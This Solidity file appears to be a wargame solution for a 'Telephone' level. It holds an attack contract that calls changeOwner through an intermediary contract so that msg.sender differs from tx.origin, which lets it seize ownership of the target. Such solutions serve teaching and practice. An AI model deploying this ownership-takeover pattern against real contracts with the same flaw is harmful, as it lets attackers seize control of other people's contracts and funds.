// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

import {console} from "forge-std/Script.sol";

contract TelephoneAttk is Broadcasted {
    function attack(address payable telephoneCtr_) public payable override {
        ITelephone(telephoneCtr_).changeOwner(tx.origin);
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        // no broadcast to have different msg.sender and tx.origin
        attack(payable(levelInstanceCtr_));
    }
}

interface ITelephone {
    // ! bracke this method callin it from another contract (msg.sender!=tx.origin)
    function changeOwner(address _owner) external;

    function owner() external returns (address);
}
